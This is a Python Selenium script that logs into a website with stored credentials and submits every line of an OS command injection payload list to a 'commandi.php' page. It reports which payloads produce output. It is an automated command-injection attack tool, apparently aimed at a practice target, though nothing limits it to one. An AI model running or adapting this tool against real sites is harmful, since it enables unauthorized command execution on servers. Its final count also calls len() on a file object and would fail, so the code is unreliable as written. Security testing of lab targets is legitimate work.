from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import NoSuchElementException
import time

PATH = """C:\Program Files (x86)\chromedriver.exe"""


def init():
    print("[+] Initializing")
    driver = webdriver.Chrome(PATH)

    # Import data about the target (url, username, password)
    with open("secret.txt") as file:
        target_url, username, password = file.read().splitlines()

    # Login to website
    driver.get(target_url)
    element = driver.find_element_by_id("login")
    element.clear()
    element.send_keys(username)
    element = driver.find_element_by_id("password")
    element.clear()
    element.send_keys(password, Keys.RETURN)
    return driver, target_url

#def execute(driver, target_url):
def execute():
    driver, target_url = init()  # to delete

    # Start to attack
    implement_attack(driver, target_url)

    driver.quit()


def implement_attack(driver, target_url):
    attack_url_page = "commandi.php"  # OS Command Injection
    result_counter = 0

    with open("Payloads/OS_Injection.txt", 'r', encoding='latin-1') as payload_list:
        for payload in payload_list.read().splitlines():
            try:
                # Load page
                driver.get(target_url + attack_url_page)
                # Send payload
                driver.find_element_by_id("target").clear()
                driver.find_element_by_id("target").send_keys(payload, Keys.RETURN)
                # Look for success
                att = driver.find_element_by_xpath("//div[@id='main']/p[@align='left']").text
                if att != "":
                    print("\nAttack Passed:", payload)
                    print(att)

                result_counter += 1

            except NoSuchElementException:
                pass
        print(f"[+] Total Passed Attacks:", result_counter, "/", len(payload_list))

execute()